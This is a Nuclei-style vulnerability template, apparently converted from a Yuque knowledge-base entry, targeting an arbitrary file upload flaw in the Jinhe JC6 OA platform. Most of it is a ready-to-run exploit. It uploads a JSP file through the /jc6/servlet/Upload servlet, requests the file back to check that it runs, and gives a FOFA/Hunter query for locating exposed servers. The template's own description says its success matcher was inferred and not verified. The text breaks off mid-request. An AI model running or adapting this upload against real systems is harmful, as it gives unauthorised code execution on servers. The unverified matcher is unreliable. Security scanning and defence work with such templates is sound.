info:
  name: 金和OAJC6Upload任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/488d9f1b201a92a2ec68315d735f0058

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 488d9f1b201a92a2ec68315d735f0058
    fofa: + hunter`web.body="JC6金和协同管理平台"`
http:
- raw:
  - 'POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1

    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1

    Content-Type: multipart/form-data; boundary=00content0boundary00

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Connection: close

    Content-Length: 169


    --00content0boundary00

    Content-Disposition: form-data; name="img"; filename="1.jsp"

    Content-Type: image/jpeg


    <% out.println("hello"); %>

    --00content0boundary00--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /jc6/upload/402882838d63f2dd018d77bce0766e8f.jsp HTTP/1.1

